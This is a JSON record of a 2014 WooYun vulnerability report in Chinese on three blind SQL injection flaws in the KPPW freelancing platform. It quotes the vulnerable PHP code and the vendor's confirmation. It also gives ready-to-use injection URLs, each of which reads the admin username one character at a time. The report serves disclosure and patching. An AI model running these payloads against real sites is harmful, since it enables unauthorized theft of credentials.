{"id": 58706, "wybug_id": "wooyun-2014-050078", "wybug_title": "kppw威客系统存在多处SQL盲注漏洞", "wybug_corp": "keke.com", "wybug_author": "lancer", "wybug_date": "2014-04-01 12:05", "wybug_open_date": "2014-06-30 12:05", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "代码审计", "源码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-30：\t细节向公众公开  简要描述： 参数过滤不严导致盲注,可以获取管理员用户名和密码 详细说明：  第一处漏洞代码：/control/ajax/ajax_indus.php 11~31行\nif (isset ( $code ) && $code == 'r5tv') {\t$tem_arr = array ($indus_pid );\t$indus_p_arr = kekezu::get_indus_by_index ( 1, $indus_pid );\tforeach ( $indus_p_arr [$indus_pid] as $k => $v ) {\t\tarray_push ( $tem_arr, $v ['indus_id'] );\t}\t$indus_ids = implode ( ',', $tem_arr );\tunset ( $tem_arr );\t$skill_obj = new Keke_witkey_skill_class ();\t$skill_obj->setWhere ( \"indus_id in ($indus_ids)\" );\t$skill_arr = $skill_obj->query_keke_witkey_skill ();\tif (count ( $skill_arr ) == 0) {\t\t$option = array ($_lang['no_relation_skill']);\t} else {\t\tforeach ( $skill_arr as $row ) {\t\t\t$option [] = $row [skill_id] . '=>' . $row [skill_name];\t\t}\t}\techo implode ( '|', $option );\texit ();}\n变量$indus_pid过滤不严导致了注入。第二处漏洞代码：/lib/inc/keke_user_mark_class.php 221~253行\npublic static function get_user_aid($uid, $mark_type, $mark_status = null, $role_type = null, $model_code = null, $obj_id = null) {\t\t$aid_config = self::get_mark_aid ( $mark_type ); \t\t$where = \"  mark_type='$mark_type' \";\t\t$role_type == '1' and $where .= \" and uid='$uid'\";\t\t$role_type == '2' and $where .= \" and by_uid='$uid'\";\t\tif(is_null($mark_status)){\t\t\t$where .= \" and mark_status > 0\";\t\t}else{\t\t\t$where .= \" and mark_status = $mark_status\";\t\t}\t\t$model_code and $where .= \" and model_code='$model_code' \";\t\t$obj_id and $where .= \" and obj_id = '$obj_id' \";\t\t$aid_arr = db_factory::query ( \" select aid,aid_star from \" . TABLEPRE . \"witkey_mark where $where \" );\t\t$aid_info = array ();\t\t$si = sizeof ( $aid_arr );\t\tforeach ( $aid_config as $k => $v ) {\t\t\tif($aid_arr){\t\t\t\tfor($i = 0; $i < $si; $i ++) {\t\t\t\t\t$aid_arr [$i] ['aid'] and $aid = explode ( \",\", $aid_arr [$i] ['aid'] ) or $aid = array (); \t\t\t\t\t$aid_arr [$i] ['aid_star'] and $star = explode ( \",\", $aid_arr [$i] ['aid_star'] ) or $star = array (); \t\t\t\t\t$aid&&$star and $aid_s = array_combine ( $aid, $star ); \t\t\t\t\t$aid_info [$k] ['aid_name'] = $v ['aid_name']; \t\t\t\t\t$aid_info [$k] ['star'] += floatval($aid_s [$k] ); \t\t\t\t\t$aid_info [$k] ['count'] += 1; \t\t\t\t}\t\t\t}else{\t\t\t\t$aid_info [$k] ['aid_name'] = $v ['aid_name']; \t\t\t\t$aid_info [$k] ['star']     = 0; \t\t\t\t$aid_info [$k] ['count']    = 0; \t\t\t}\t\t}\t\treturn self::consider_star ( $aid_info );\t}\n$mark_status变量过滤不严，导致注入第三处漏洞代码：/control/ajax/ajax_menu.php 30~39行\ncase \"load_square\" :\t\tif ($ids) {\t\t\t$model_info = kekezu::get_table_data('*','witkey_model','model_status=1','','','','model_code');            $cash_cove = $kekezu->get_cash_cove('',true);\t\t\t$op_desc = array('pub'=>'发布','leave'=>'留言','work'=>'投稿','focus'=>'收藏','buy'=>'购买');\t\t\t$square_arr = db_factory::query( sprintf ( \" select * from %switkey_weibo where weibo_id in ($ids) order by on_time desc\", TABLEPRE ) );\t\t} else {\t\t\tdie ();\t\t}\t\tbreak;\n$ids变量过滤不严，导致注入。   漏洞证明：  第一处漏洞利用过程：1.直接访问/index.php?do=ajax&view=indus&code=r5tv&indus_pid=0) || substr((select username from keke_witkey_member where uid=1),1,1)=0x61 limit 1%23匹配成功时有数据显示不成功时显示\"没有相关技能\"\n\n\n\n第二出漏洞利用过程：1.直接访问/index.php?do=ajax&view=task&ajax=mark_aid&auid=-1&mark_type=1&mark_status=1 || substr((select username from keke_witkey_member where uid=1),1,1)=0x61匹配成功\n\n匹配不成功\n\n第三处漏洞利用过程：1.先在广场发布一条信息（防止weibo表中没有数据）\n\n2.直接访问/index.php?do=ajax&view=menu&ajax=load_square&ids=1) and substr((select username from keke_witkey_member where uid=1),1,1)=0x61%23匹配成功\n\n不成功\n\n   修复方案：  过滤   版权声明：转载请注明来源 lancer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-04-01 14:28 厂商回复： 感谢关注，我们会尽力发布补丁包处理相关问题 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}